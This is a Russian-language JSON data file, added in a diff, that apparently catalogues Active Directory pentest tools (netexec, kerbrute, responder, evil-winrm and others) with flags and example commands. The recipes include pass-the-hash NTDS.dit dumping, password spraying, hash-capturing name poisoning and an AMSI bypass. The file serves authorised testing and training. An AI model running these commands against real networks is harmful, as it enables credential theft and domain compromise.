@@ -1,0 +1,725 @@
+{
+  "category": "Network / AD",
+  "catOrder": 3,
+  "tools": [
+    {
+      "title": "netexec (nxc, бывш. crackmapexec)",
+      "subcategory": "массовый аудит протоколов AD/сети",
+      "purpose": "Швейцарский нож для аудита домена и сети: проверка кредов, перечисление SMB/LDAP, дамп секретов, выполнение команд по WMI/SMB и запуск модулей разом по списку хостов. Прямой наследник CrackMapExec.",
+      "install": "pipx install netexec",
+      "binary": "nxc",
+      "target": "{TARGET}",
+      "modes": [
+        { "name": "smb", "desc": "Аудит SMB: шары, пользователи, RID-brute, дамп SAM/NTDS, выполнение команд.", "target": "{TARGET}" },
+        { "name": "ldap", "desc": "Перечисление AD через LDAP: пользователи, AS-REP/Kerberoast, делегирование, BloodHound.", "target": "{TARGET}" },
+        { "name": "winrm", "desc": "Проверка кредов и выполнение команд через WinRM (5985/5986).", "target": "{TARGET}" },
+        { "name": "mssql", "desc": "Аудит MSSQL: вход, выполнение T-SQL и xp_cmdshell.", "target": "{TARGET}" },
+        { "name": "ssh", "desc": "Проверка SSH-кредов и выполнение команд.", "target": "{TARGET}" },
+        { "name": "wmi", "desc": "Проверка кредов и выполнение команд через WMI.", "target": "{TARGET}" }
+      ],
+      "groups": [
+        {
+          "name": "Аутентификация",
+          "flags": [
+            { "flag": "-u", "value": "user", "desc": "Имя пользователя или файл со списком имён." },
+            { "flag": "-p", "value": "password", "desc": "Пароль или файл со списком паролей (перебор по всем -u)." },
+            { "flag": "-H", "value": "NTHASH", "desc": "NTLM-хеш для Pass-the-Hash вместо пароля." },
+            { "flag": "-k", "desc": "Аутентификация через Kerberos (использует билет из окружения / ccache)." },
+            { "flag": "--local-auth", "desc": "Локальная аутентификация на хосте, а не доменная (для локальных учёток)." },
+            { "flag": "-d", "value": "domain.local", "desc": "Домен для доменной аутентификации." },
+            { "flag": "--kdcHost", "value": "{TARGET}", "desc": "Адрес KDC/контроллера домена (нужен для Kerberos)." },
+            { "flag": "--continue-on-success", "desc": "Не останавливаться после первого валидного логина — для password spray по списку." }
+          ]
+        },
+        {
+          "name": "SMB-перечисление",
+          "flags": [
+            { "flag": "--shares", "desc": "Перечислить сетевые шары и права доступа (READ/WRITE) к ним." },
+            { "flag": "--users", "desc": "Перечислить доменных пользователей." },
+            { "flag": "--rid-brute", "value": "4000", "desc": "Брутфорс RID для вытаскивания пользователей (работает и с null-сессией). Опц. макс. RID." },
+            { "flag": "--pass-pol", "desc": "Получить парольную политику домена." },
+            { "flag": "--sam", "desc": "Дамп локальных хешей из SAM (нужны админ-права)." },
+            { "flag": "--ntds", "desc": "Дамп хешей всех доменных учёток из NTDS.dit (на DC, через DRSUAPI)." }
+          ]
+        },
+        {
+          "name": "SMB-перечисление (доп.)",
+          "flags": [
+            { "flag": "--groups", "value": "Domain Admins", "desc": "Перечислить доменные группы (или участников конкретной группы)." },
+            { "flag": "--local-groups", "desc": "Перечислить локальные группы на хосте." },
+            { "flag": "--sessions", "desc": "Показать активные сессии на хосте." },
+            { "flag": "--loggedon-users", "desc": "Показать залогиненных пользователей." },
+            { "flag": "--disks", "desc": "Перечислить диски на хосте." },
+            { "flag": "--lsa", "desc": "Дамп секретов LSA." }
+          ]
+        },
+        {
+          "name": "Выполнение команд",
+          "flags": [
+            { "flag": "-x", "value": "whoami", "desc": "Выполнить команду через cmd на цели." },
+            { "flag": "-X", "value": "$PSVersionTable", "desc": "Выполнить команду через PowerShell на цели." },
+            { "flag": "--exec-method", "value": "wmiexec", "desc": "Метод выполнения: wmiexec, atexec, smbexec, mmcexec." }
+          ]
+        },
+        {
+          "name": "Модули",
+          "flags": [
+            { "flag": "-L", "desc": "Показать список доступных модулей для протокола." },
+            { "flag": "-M", "value": "spider_plus", "desc": "Запустить модуль по имени." },
+            { "flag": "-o", "value": "KEY=value", "desc": "Передать опции модулю (KEY=value, можно несколько). Список опций — через --options." },
+            { "flag": "--options", "desc": "Показать опции выбранного модуля (-M ... --options)." }
+          ]
+        },
+        {
+          "name": "LDAP-атаки",
+          "flags": [
+            { "flag": "--asreproast", "value": "asrep.txt", "desc": "Собрать AS-REP хеши пользователей без преаутентификации (в файл).", "mode": "ldap" },
+            { "flag": "--kerberoasting", "value": "kerb.txt", "desc": "Собрать TGS-хеши сервисных учёток (Kerberoasting, в файл).", "mode": "ldap" },
+            { "flag": "--trusted-for-delegation", "desc": "Найти учётки с unconstrained delegation.", "mode": "ldap" },
+            { "flag": "--bloodhound", "desc": "Собрать данные для BloodHound через LDAP (с --collection).", "mode": "ldap" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "nxc smb {TARGET} -u user -p password --shares", "note": "Проверить креды и перечислить доступные шары на хосте." },
+        { "cmd": "nxc smb {TARGET} -u '' -p '' --rid-brute", "note": "Вытащить пользователей через null-сессию RID-брутом." },
+        { "cmd": "nxc smb {TARGET} -u user -p 'Password1' --continue-on-success", "note": "Password spray одного пароля по списку хостов/целей." },
+        { "cmd": "nxc smb {TARGET} -u admin -H aad3b...:31d6c... --ntds", "note": "Pass-the-Hash на DC и дамп NTDS.dit со всеми хешами домена." },
+        { "cmd": "nxc ldap {TARGET} -u user -p pass --asreproast asrep.txt", "note": "Сбор AS-REP хешей пользователей без преаутентификации." },
+        { "cmd": "nxc smb {TARGET} -u user -p pass -x whoami", "note": "Выполнить команду на цели (по умолчанию через wmiexec/smbexec)." }
+      ],
+      "notes": "Первый аргумент после nxc — всегда протокол (smb/ldap/winrm/mssql/ssh/wmi/rdp/ftp/vnc), затем цель (IP/CIDR/файл). -u и -p принимают файлы — перебор идёт автоматически по всем парам. Зелёный (+) — валидные креды, (Pwn3d!) — есть админ-доступ. Конфиг и логи: ~/.nxc/. Наследует синтаксис CrackMapExec."
+    },
+    {
+      "title": "enum4linux-ng",
+      "subcategory": "комплексное перечисление SMB/RPC",
+      "purpose": "Переписанный на Python enum4linux: одним запуском собирает с SMB/RPC-хоста пользователей, группы, шары, парольную политику, ОС, RID-cycling и экспортирует в JSON/YAML. Удобен для быстрой разведки Windows/Samba.",
+      "install": "pipx install enum4linux-ng",
+      "binary": "enum4linux-ng",
+      "target": "{TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Главное",
+          "flags": [
+            { "flag": "-A", "desc": "Полное «простое» перечисление: пользователи, группы, шары, политика, ОС, NetBIOS, принтеры (-U -G -S -P -O -N -I -L)." },
+            { "flag": "-As", "desc": "То же, что -A, но без NetBIOS-запросов." },
+            { "flag": "-R", "value": "100", "desc": "RID-cycling — перебор RID для вытаскивания пользователей. Опц. размер пачки." },
+            { "flag": "-v", "desc": "Подробный вывод." }
+          ]
+        },
+        {
+          "name": "Что перечислять",
+          "flags": [
+            { "flag": "-U", "desc": "Получить пользователей через RPC." },
+            { "flag": "-G", "desc": "Получить группы через RPC." },
+            { "flag": "-Gm", "desc": "Получить группы вместе с участниками через RPC." },
+            { "flag": "-S", "desc": "Получить шары через RPC." },
+            { "flag": "-P", "desc": "Получить парольную политику через RPC." },
+            { "flag": "-O", "desc": "Получить информацию об ОС." },
+            { "flag": "-L", "desc": "Получить информацию о домене через LDAP/LDAPS." },
+            { "flag": "-I", "desc": "Получить информацию о принтерах через RPC." },
+            { "flag": "-N", "desc": "NetBIOS lookup имён." },
+            { "flag": "-C", "desc": "Получить службы через RPC." }
+          ]
+        },
+        {
+          "name": "Аутентификация",
+          "flags": [
+            { "flag": "-u", "value": "user", "desc": "Имя пользователя (по умолчанию пустое — null-сессия)." },
+            { "flag": "-p", "value": "password", "desc": "Пароль (по умолчанию пустой)." },
+            { "flag": "-H", "value": "NTHASH", "desc": "Аутентификация по NT-хешу." },
+            { "flag": "-K", "value": "ticket.ccache", "desc": "Аутентификация через Kerberos-билет (для AD)." },
+            { "flag": "--local-auth", "desc": "Локальная аутентификация, а не доменная." },
+            { "flag": "-w", "value": "DOMAIN", "desc": "Указать рабочую группу/домен (по умолчанию автоопределение)." }
+          ]
+        },
+        {
+          "name": "Тонкая настройка",
+          "flags": [
+            { "flag": "-d", "desc": "Детальная информация по пользователям и группам (к -U/-G/-R)." },
+            { "flag": "-r", "value": "500-550,1000-1050", "desc": "Диапазоны RID для перебора (дефолт 500-550,1000-1050)." },
+            { "flag": "-k", "value": "administrator,guest,krbtgt", "desc": "Заведомо существующие имена для проверки (через запятую)." },
+            { "flag": "-s", "value": "shares.txt", "desc": "Брутфорс шар по словарю из файла." },
+            { "flag": "-t", "value": "10", "desc": "Таймаут соединения в секундах (дефолт 10)." }
+          ]
+        },
+        {
+          "name": "Вывод",
+          "flags": [
+            { "flag": "-oJ", "value": "out", "desc": "Экспорт результатов в JSON (расширение добавляется автоматически)." },
+            { "flag": "-oY", "value": "out", "desc": "Экспорт результатов в YAML." },
+            { "flag": "-oA", "value": "out", "desc": "Экспорт сразу в JSON и YAML." }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "enum4linux-ng -A {TARGET}", "note": "Полное перечисление с null-сессией — стандартный первый прогон." },
+        { "cmd": "enum4linux-ng -A -u user -p password {TARGET}", "note": "То же, но с валидными доменными кредами (больше данных)." },
+        { "cmd": "enum4linux-ng -R -r 500-2000 {TARGET}", "note": "Перечисление пользователей через RID-cycling в расширенном диапазоне." },
+        { "cmd": "enum4linux-ng -A -oA result {TARGET}", "note": "Полный прогон с сохранением в result.json и result.yaml." }
+      ],
+      "notes": "Цель — позиционный аргумент (IP/hostname) в конце команды. По умолчанию работает анонимно (null-сессия). -A покрывает большинство нужд; точечные флаги (-U/-S/...) удобны для шумных целей. Требует пакеты smbclient/samba-common (использует их под капотом)."
+    },
+    {
+      "title": "smbclient / smbmap",
+      "subcategory": "доступ к SMB-шарам",
+      "purpose": "smbclient — FTP-подобный клиент для подключения к SMB-шарам, листинга и скачивания/загрузки файлов. smbmap — массовое перечисление шар с показом прав доступа, рекурсивный обход и выполнение команд.",
+      "install": "sudo apt install smbclient; pipx install smbmap",
+      "binary": "smbclient",
+      "target": "-L //{TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Цель и подключение",
+          "flags": [
+            { "flag": "-L", "value": "//{TARGET}", "desc": "Перечислить доступные шары на сервере (//host или host)." },
+            { "flag": "-p", "value": "445", "desc": "Порт SMB (дефолт 445)." },
+            { "flag": "-m", "value": "SMB3", "desc": "Максимальная версия протокола SMB (SMB2/SMB3)." },
+            { "flag": "-I", "value": "{TARGET}", "desc": "Явно задать IP цели (если имя не резолвится)." }
+          ]
+        },
+        {
+          "name": "Аутентификация",
+          "flags": [
+            { "flag": "-U", "value": "user", "desc": "Имя пользователя (можно DOMAIN/user или user%password)." },
+            { "flag": "-N", "desc": "Без пароля (анонимный/null доступ) — не спрашивать пароль." },
+            { "flag": "--pw-nt-hash", "desc": "Трактовать пароль из -U как NT-хеш (Pass-the-Hash)." },
+            { "flag": "-k", "desc": "Аутентификация через Kerberos." },
+            { "flag": "-W", "value": "DOMAIN", "desc": "Рабочая группа/домен." }
+          ]
+        },
+        {
+          "name": "Выполнение и вывод",
+          "flags": [
+            { "flag": "-c", "value": "ls; get file", "desc": "Выполнить команды неинтерактивно (через ;): ls, get, put, mget…" },
+            { "flag": "-d", "value": "1", "desc": "Уровень отладки." },
+            { "flag": "-g", "desc": "Машиночитаемый (grep-friendly) вывод." }
+          ]
+        },
+        {
+          "name": "Команды внутри сессии",
+          "flags": [
+            { "flag": "ls", "desc": "Список файлов в текущем каталоге шары." },
+            { "flag": "get", "value": "file", "desc": "Скачать файл с шары." },
+            { "flag": "put", "value": "file", "desc": "Загрузить файл на шару." },
+            { "flag": "mget", "value": "*", "desc": "Скачать несколько файлов по маске (с prompt OFF / recurse ON)." },
+            { "flag": "cd", "value": "dir", "desc": "Перейти в каталог на шаре." }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "smbclient -L //{TARGET} -N", "note": "Анонимно перечислить шары на хосте." },
+        { "cmd": "smbclient //{TARGET}/share -U 'user%password'", "note": "Подключиться к конкретной шаре с кредами (интерактивная сессия)." },
+        { "cmd": "smbclient //{TARGET}/share -N -c 'recurse ON; ls'", "note": "Анонимно рекурсивно вывести всё содержимое шары." },
+        { "cmd": "smbclient //{TARGET}/share -U user --pw-nt-hash -c 'get secret.txt'", "note": "Pass-the-Hash и скачивание файла одной командой." },
+        { "cmd": "smbmap -H {TARGET} -u user -p password -R", "note": "smbmap: рекурсивно показать шары и права доступа." }
+      ],
+      "notes": "smbclient: цель в формате //host/share (или -L //host для листинга). smbmap (binary smbmap) — отдельная тулза: -H host (цель), -u/-p/-d (креды/домен), -L (все диски), -r [PATH] (листинг каталога), -R [PATH] (рекурсивно), --download / --upload SRC DST (файлы), -x 'cmd' (выполнить команду). smbmap удобнее для быстрого обзора прав по всем шарам сразу."
+    },
+    {
+      "title": "rpcclient",
+      "subcategory": "MS-RPC клиент для перечисления AD",
+      "purpose": "Клиент для вызова MS-RPC функций на Windows/Samba. Главный инструмент ручного перечисления домена через null-сессию или с кредами: пользователи, группы, SID, парольная политика, информация о сервере.",
+      "install": "sudo apt install smbclient",
+      "binary": "rpcclient",
+      "target": "{TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Подключение",
+          "flags": [
+            { "flag": "-U", "value": "user%password", "desc": "Учётные данные (user, user%password или DOMAIN/user)." },
+            { "flag": "-N", "desc": "Без пароля — null-сессия (анонимно)." },
+            { "flag": "-W", "value": "DOMAIN", "desc": "Рабочая группа/домен." },
+            { "flag": "-k", "desc": "Аутентификация через Kerberos." },
+            { "flag": "--pw-nt-hash", "desc": "Трактовать пароль из -U как NT-хеш (Pass-the-Hash)." },
+            { "flag": "-c", "value": "enumdomusers", "desc": "Выполнить команду(ы) неинтерактивно (через ;) вместо интерактивной сессии." }
+          ]
+        },
+        {
+          "name": "Команды: пользователи/группы",
+          "flags": [
+            { "flag": "enumdomusers", "desc": "Список доменных пользователей и их RID." },
+            { "flag": "enumdomgroups", "desc": "Список доменных групп и их RID." },
+            { "flag": "querydispinfo", "desc": "Пользователи с именами, full name и описанием (часто видит больше, чем enumdomusers)." },
+            { "flag": "queryuser", "value": "0x457", "desc": "Детальная информация о пользователе по RID." },
+            { "flag": "queryusergroups", "value": "0x457", "desc": "Группы пользователя по его RID." }
+          ]
+        },
+        {
+          "name": "Команды: домен/SID",
+          "flags": [
+            { "flag": "lsaquery", "desc": "Получить SID домена и имя." },
+            { "flag": "lookupnames", "value": "administrator", "desc": "Получить SID по имени учётки." },
+            { "flag": "lookupsids", "value": "S-1-5-21-...-500", "desc": "Получить имя учётки по SID (ручной RID-cycling)." },
+            { "flag": "getdompwinfo", "desc": "Парольная политика домена (минимальная длина, сложность)." },
+            { "flag": "enumdomains", "desc": "Список доменов на сервере." }
+          ]
+        },
+        {
+          "name": "Команды: сервер/прочее",
+          "flags": [
+            { "flag": "srvinfo", "desc": "Информация о сервере (тип, версия ОS)." },
+            { "flag": "netshareenumall", "desc": "Перечислить все шары через RPC." },
+            { "flag": "enumprinters", "desc": "Перечислить принтеры." },
+            { "flag": "lsaenumsid", "desc": "Перечислить SID, известные LSA." }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "rpcclient -U '' -N {TARGET}", "note": "Открыть интерактивную null-сессию для ручного перечисления." },
+        { "cmd": "rpcclient -U '' -N {TARGET} -c 'enumdomusers'", "note": "Быстро вытащить список доменных пользователей анонимно." },
+        { "cmd": "rpcclient -U '' -N {TARGET} -c 'querydispinfo'", "note": "Пользователи с описаниями (иногда там лежат пароли)." },
+        { "cmd": "rpcclient -U 'user%pass' {TARGET} -c 'getdompwinfo; lsaquery'", "note": "Парольная политика и SID домена с валидными кредами." }
+      ],
+      "notes": "Цель — позиционный аргумент (IP/hostname). Без -c открывается интерактивная оболочка rpcclient $>, где команды вводятся по одной. Через -c команды разделяются ';'. Null-сессия (-U '' -N) часто доступна на старых/неконфигурированных DC. Команды querydispinfo и enumdomusers могут давать разный охват — пробуй обе."
+    },
+    {
+      "title": "ldapsearch",
+      "subcategory": "запросы к LDAP/AD",
+      "purpose": "Стандартный клиент OpenLDAP для запросов к каталогу. В пентесте AD — извлечение пользователей, групп, описаний, SPN, атрибутов через анонимный или аутентифицированный bind. Точный контроль над фильтрами и атрибутами.",
+      "install": "sudo apt install ldap-utils",
+      "binary": "ldapsearch",
+      "target": "-H ldap://{TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Подключение и bind",
+          "flags": [
+            { "flag": "-H", "value": "ldap://{TARGET}", "desc": "URI сервера (ldap://host:389 или ldaps://host:636)." },
+            { "flag": "-x", "desc": "Простая аутентификация (нужна даже для анонимного bind, вместо SASL)." },
+            { "flag": "-D", "value": "user@domain.local", "desc": "Bind DN — учётка для аутентификации (UPN или полный DN)." },
+            { "flag": "-w", "value": "password", "desc": "Пароль в командной строке." },
+            { "flag": "-W", "desc": "Спросить пароль интерактивно (не светить в истории)." },
+            { "flag": "-y", "value": "pass.txt", "desc": "Читать пароль из файла." }
+          ]
+        },
+        {
+          "name": "Параметры поиска",
+          "flags": [
+            { "flag": "-b", "value": "DC=domain,DC=local", "desc": "База поиска (Base DN) — корень, от которого искать." },
+            { "flag": "-s", "value": "sub", "desc": "Область поиска: base, one, sub (по умолчанию sub)." },
+            { "flag": "-z", "value": "1000", "desc": "Лимит числа записей в ответе." },
+            { "flag": "-l", "value": "60", "desc": "Лимит времени на поиск (сек)." }
+          ]
+        },
+        {
+          "name": "Формат вывода",
+          "flags": [
+            { "flag": "-LLL", "desc": "Убрать комментарии и версию LDIF из вывода (чистый результат)." },
+            { "flag": "-o", "value": "ldif-wrap=no", "desc": "Опции вывода; ldif-wrap=no убирает перенос длинных строк." },
+            { "flag": "-E", "value": "pr=1000/noprompt", "desc": "Расширение запроса; paged results (pr) для обхода лимита AD в 1000 записей." },
+            { "flag": "-t", "desc": "Сохранять бинарные значения атрибутов во временные файлы." }
+          ]
+        },
+        {
+          "name": "Фильтр и атрибуты (позиционно)",
+          "flags": [
+            { "flag": "(objectClass=*)", "desc": "Фильтр поиска — первый позиционный аргумент после опций." },
+            { "flag": "(objectClass=user)", "desc": "Найти все объекты-пользователи." },
+            { "flag": "(&(objectClass=user)(servicePrincipalName=*))", "desc": "Учётки с SPN — кандидаты на Kerberoasting." },
+            { "flag": "sAMAccountName description", "desc": "Список атрибутов для вывода — после фильтра (иначе все атрибуты)." }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "ldapsearch -H ldap://{TARGET} -x -s base -b '' defaultNamingContext", "note": "Анонимно узнать Base DN домена (RootDSE доступен почти всегда)." },
+        { "cmd": "ldapsearch -H ldap://{TARGET} -x -LLL -b 'DC=domain,DC=local' '(objectClass=user)' sAMAccountName description", "note": "Перечислить пользователей и их описания (анонимно, если разрешён bind)." },
+        { "cmd": "ldapsearch -H ldap://{TARGET} -x -D 'user@domain.local' -w pass -b 'DC=domain,DC=local' '(objectClass=*)' -o ldif-wrap=no", "note": "Полный дамп каталога с валидными кредами без переноса строк." },
+        { "cmd": "ldapsearch -H ldap://{TARGET} -x -D 'u@d.local' -w pass -b 'DC=d,DC=local' '(&(objectClass=user)(servicePrincipalName=*))' servicePrincipalName", "note": "Найти учётки с SPN для Kerberoasting." }
+      ],
+      "notes": "AD запрещает анонимный поиск кроме RootDSE — обычно нужны креды (-D/-w). Фильтр и список атрибутов идут ПОЗИЦИОННО после всех опций. Для дампа >1000 объектов используй paged results: -E pr=1000/noprompt. Base DN можно вытащить из RootDSE (-s base -b ''). Связанные тулзы: windapsearch, ldapdomaindump."
+    },
+    {
+      "title": "kerbrute",
+      "subcategory": "брутфорс Kerberos pre-auth",
+      "purpose": "Быстрый и относительно тихий перебор через Kerberos pre-auth: валидация имён пользователей, password spray и брутфорс. Не вызывает событие 4625 при неудачной преаутентификации, поэтому скрытнее обычных методов.",
+      "install": "go install github.com/ropnop/kerbrute@latest",
+      "binary": "kerbrute",
+      "target": "--dc {TARGET}",
+      "modes": [
+        { "name": "userenum", "desc": "Проверка существования имён пользователей по словарю.", "target": "--dc {TARGET}" },
+        { "name": "passwordspray", "desc": "Один пароль против списка пользователей.", "target": "--dc {TARGET}" },
+        { "name": "bruteuser", "desc": "Перебор паролей по словарю против одного пользователя.", "target": "--dc {TARGET}" },
+        { "name": "bruteforce", "desc": "Перебор пар user:password из файла или stdin.", "target": "--dc {TARGET}" }
+      ],
+      "groups": [
+        {
+          "name": "Цель (обязательно)",
+          "flags": [
+            { "flag": "--dc", "value": "{TARGET}", "desc": "Адрес контроллера домена (KDC). Если не задан — ищется через DNS." },
+            { "flag": "-d", "value": "domain.local", "desc": "Полное имя домена (например contoso.com). Обязателен один из --dc/-d." }
+          ]
+        },
+        {
+          "name": "Производительность",
+          "flags": [
+            { "flag": "-t", "value": "10", "desc": "Число потоков (дефолт 10)." },
+            { "flag": "--delay", "value": "100", "desc": "Задержка между попытками (мс); включает однопоточный режим." },
+            { "flag": "--safe", "desc": "Прервать работу, если обнаружена заблокированная учётка (защита от локаута)." }
+          ]
+        },
+        {
+          "name": "Прочее",
+          "flags": [
+            { "flag": "-o", "value": "results.txt", "desc": "Писать лог в файл." },
+            { "flag": "-v", "desc": "Логировать неудачи и ошибки (по умолчанию только успехи)." },
+            { "flag": "--downgrade", "desc": "Принудительно слабое шифрование (arcfour-hmac-md5)." }
+          ]
+        },
+        {
+          "name": "Аргументы userenum",
+          "flags": [
+            { "flag": "users.txt", "desc": "Файл со списком имён пользователей для проверки (позиционно)." }
+          ]
+        },
+        {
+          "name": "Аргументы passwordspray",
+          "flags": [
+            { "flag": "users.txt", "desc": "Файл со списком пользователей (1-й позиционный)." },
+            { "flag": "Password1", "desc": "Один пароль для проверки против всех (2-й позиционный)." }
+          ]
+        },
+        {
+          "name": "Аргументы bruteuser / bruteforce",
+          "flags": [
+            { "flag": "passwords.txt", "desc": "bruteuser: словарь паролей (1-й позиц.), затем имя пользователя (2-й)." },
+            { "flag": "combos.txt", "desc": "bruteforce: файл с парами user:password (или '-' для stdin)." }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "kerbrute userenum --dc {TARGET} -d domain.local users.txt", "note": "Проверить, какие имена из словаря — валидные доменные учётки." },
+        { "cmd": "kerbrute passwordspray --dc {TARGET} -d domain.local users.txt 'Spring2026!'", "note": "Распылить один пароль по всем пользователям (с --safe от локаута)." },
+        { "cmd": "kerbrute bruteuser --dc {TARGET} -d domain.local rockyou.txt administrator", "note": "Перебор паролей по словарю против одного пользователя." },
+        { "cmd": "kerbrute bruteforce --dc {TARGET} -d domain.local combos.txt", "note": "Перебор готовых пар user:password из файла." }
+      ],
+      "notes": "Обязательно указывать домен (-d) и желательно --dc (иначе DNS-резолв KDC). userenum не вызывает событие неудачного входа 4625 — самый тихий способ валидации имён. Для spray всегда добавляй --safe, чтобы не заблокировать учётки. Имена пользователей чувствительны к существованию, но не блокируют при userenum."
+    },
+    {
+      "title": "responder",
+      "subcategory": "отравление LLMNR/NBT-NS/MDNS",
+      "purpose": "Отравитель протоколов разрешения имён (LLMNR, NBT-NS, MDNS) со встроенными rogue-серверами HTTP/SMB/MSSQL/LDAP. Перехватывает NTLMv1/v2 хеши из broadcast-запросов жертв для последующего крекинга или relay.",
+      "install": "sudo apt install responder",
+      "binary": "responder",
+      "target": "",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Интерфейс и режим",
+          "flags": [
+            { "flag": "-I", "value": "tun0", "desc": "Сетевой интерфейс для прослушивания (обязательно)." },
+            { "flag": "-A", "desc": "Режим анализа — только наблюдать запросы, НЕ отвечать (пассивная разведка)." },
+            { "flag": "-v", "desc": "Подробный вывод." },
+            { "flag": "-Q", "desc": "Тихий режим." }
+          ]
+        },
+        {
+          "name": "Отравление",
+          "flags": [
+            { "flag": "-w", "desc": "Включить rogue WPAD-прокси (перехват HTTP-аутентификации браузеров)." },
+            { "flag": "-F", "desc": "Форсировать аутентификацию для WPAD (rogue PAC требует логин)." },
+            { "flag": "-P", "desc": "Форсировать аутентификацию на прокси (вместе с -w)." },
+            { "flag": "-d", "desc": "Отвечать на NetBIOS domain suffix запросы." },
+            { "flag": "-r", "desc": "Отвечать на NetBIOS wredir-запросы (осторожно — шумно)." }
+          ]
+        },
+        {
+          "name": "DHCP-отравление",
+          "flags": [
+            { "flag": "-D", "desc": "Включить ответы rogue DHCP (DHCPv4) с инъекцией WPAD/DNS." },
+            { "flag": "--dhcpv6", "desc": "Включить отравление DHCPv6 (mitm6-подобное)." }
+          ]
+        },
+        {
+          "name": "Аутентификация и тонкости",
+          "flags": [
+            { "flag": "-b", "desc": "Отдавать Basic HTTP-аутентификацию вместо NTLM (пароли открытым текстом)." },
+            { "flag": "--lm", "desc": "Форсировать даунгрейд до LM-хешей (легче крекать) на старых клиентах." },
+            { "flag": "--disable-ess", "desc": "Отключить Extended Session Security (даунгрейд NTLMv1)." },
+            { "flag": "-E", "desc": "Возвращать код ошибки вместо вызова аутентификации (заставить ретрай)." },
+            { "flag": "-u", "value": "HOST:PORT", "desc": "Upstream-прокси для перехваченного трафика." }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "responder -I {LHOST_IF} -A", "note": "Пассивный анализ: посмотреть, кто шлёт LLMNR/NBT-NS, ничего не отравляя." },
+        { "cmd": "sudo responder -I tun0", "note": "Базовое отравление LLMNR/NBT-NS/MDNS со сбором NTLM-хешей." },
+        { "cmd": "sudo responder -I tun0 -wd", "note": "Отравление + rogue WPAD-прокси + ответы на domain suffix." },
+        { "cmd": "sudo responder -I tun0 -b", "note": "Перехват Basic-аутентификации (пароли открытым текстом, не хеши)." }
+      ],
+      "notes": "Интерфейс задаётся через -I, отдельной позиционной цели нет (отравляется весь broadcast-сегмент). Перехваченные хеши и логи: /usr/share/responder/logs/ (формат под hashcat). Конфиг — /etc/responder/Responder.conf (там включаются/выключаются конкретные серверы). Перед relay-атакой отключи SMB/HTTP-серверы в конфиге и используй ntlmrelayx. Запускать от root."
+    },
+    {
+      "title": "evil-winrm",
+      "subcategory": "интерактивный WinRM-шелл",
+      "purpose": "Полнофункциональный шелл для удалённого доступа к Windows через WinRM (5985/5986). Поддерживает Pass-the-Hash, Kerberos, загрузку/скачивание файлов, выполнение .NET-сборок и AMSI-байпас. Стандарт после получения кредов с WinRM-доступом.",
+      "install": "gem install evil-winrm",
+      "binary": "evil-winrm",
+      "target": "-i {TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Цель и подключение",
+          "flags": [
+            { "flag": "-i", "value": "{TARGET}", "desc": "IP или hostname цели (обязательно)." },
+            { "flag": "-P", "value": "5985", "desc": "Порт (дефолт 5985; с -S → 5986)." },
+            { "flag": "-S", "desc": "Включить SSL/TLS (порт 5986)." },
+            { "flag": "-U", "value": "/wsman", "desc": "URL endpoint (дефолт /wsman)." }
+          ]
+        },
+        {
+          "name": "Аутентификация",
+          "flags": [
+            { "flag": "-u", "value": "user", "desc": "Имя пользователя." },
+            { "flag": "-p", "value": "password", "desc": "Пароль." },
+            { "flag": "-H", "value": "NTHASH", "desc": "NT-хеш для Pass-the-Hash (вместо пароля)." },
+            { "flag": "-r", "value": "domain.local", "desc": "Realm для Kerberos-аутентификации." },
+            { "flag": "-K", "value": "ticket.ccache", "desc": "Kerberos-билет (ccache или kirbi)." },
+            { "flag": "--spn", "value": "HTTP", "desc": "Префикс SPN для Kerberos (дефолт HTTP)." }
+          ]
+        },
+        {
+          "name": "Сертификаты (SSL)",
+          "flags": [
+            { "flag": "-c", "value": "cert.pem", "desc": "Публичный сертификат для аутентификации по сертификату." },
+            { "flag": "-k", "value": "key.pem", "desc": "Приватный ключ для аутентификации по сертификату." },
+            { "flag": "-a", "value": "Mozilla/5.0", "desc": "Кастомный User-Agent соединения." }
+          ]
+        },
+        {
+          "name": "Загрузка скриптов/бинарей и лог",
+          "flags": [
+            { "flag": "-s", "value": "/opt/scripts/", "desc": "Путь к локальным PowerShell-скриптам (подгружаются командой по имени)." },
+            { "flag": "-e", "value": "/opt/bins/", "desc": "Путь к локальным C#/.NET сборкам (для Invoke-Binary)." },
+            { "flag": "-l", "desc": "Логировать сессию." },
+            { "flag": "-N", "desc": "Отключить удалённое автодополнение путей (если тормозит)." }
+          ]
+        },
+        {
+          "name": "Команды внутри шелла",
+          "flags": [
+            { "flag": "upload", "value": "local remote", "desc": "Загрузить файл с атакующего на цель." },
+            { "flag": "download", "value": "remote local", "desc": "Скачать файл с цели." },
+            { "flag": "Invoke-Binary", "value": "/path/exe.exe args", "desc": "Выполнить .NET-сборку в памяти (из -e директории)." },
+            { "flag": "Bypass-4MSI", "desc": "Пропатчить AMSI в памяти." },
+            { "flag": "services", "desc": "Список служб и прав на них." },
+            { "flag": "menu", "desc": "Показать загруженные функции/команды." }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "evil-winrm -i {TARGET} -u user -p password", "note": "Базовое подключение с логином и паролем." },
+        { "cmd": "evil-winrm -i {TARGET} -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0", "note": "Pass-the-Hash — вход по NT-хешу без пароля." },
+        { "cmd": "evil-winrm -i {TARGET} -u user -p pass -S", "note": "Подключение по WinRM поверх SSL (порт 5986)." },
+        { "cmd": "evil-winrm -i {TARGET} -u user -p pass -s /opt/ps/ -e /opt/bins/", "note": "С подгрузкой локальных PS-скриптов и .NET-сборок для пост-эксплуатации." }
+      ],
+      "notes": "Цель задаётся флагом -i (не позиционно). Доступ требует членства пользователя в группе Remote Management Users (или админ). Внутри шелла доступны upload/download, Invoke-Binary, Bypass-4MSI, Dll-Loader, Donut-Loader. Для Kerberos нужен валидный билет в KRB5CCNAME и -r с realm. SSL (-S) переключает порт на 5986."
+    },
+    {
